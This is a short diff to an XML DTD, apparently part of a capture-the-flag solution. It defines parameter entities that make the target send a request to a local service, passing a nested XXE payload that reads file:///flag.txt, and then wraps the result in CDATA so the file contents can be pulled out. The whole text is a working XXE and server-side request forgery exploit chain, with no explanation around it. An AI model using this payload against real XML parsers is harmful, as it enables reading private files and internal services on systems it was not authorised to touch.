@@ -1,1 +1,4 @@
-<!ENTITY all "%start;%stuff;%end;">
+<!ENTITY % data SYSTEM "http://localhost:5000/cross-the-bridge?incantation=<!DOCTYPEX+[<!ENTITY+xxe+SYSTEM+%22file%3a///flag.txt%22+>]><z>%26xxe%3b</z>">
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % end "]]>">
+<!ENTITY % all "<!ENTITY fileContents '%start;%data;%end;'>">
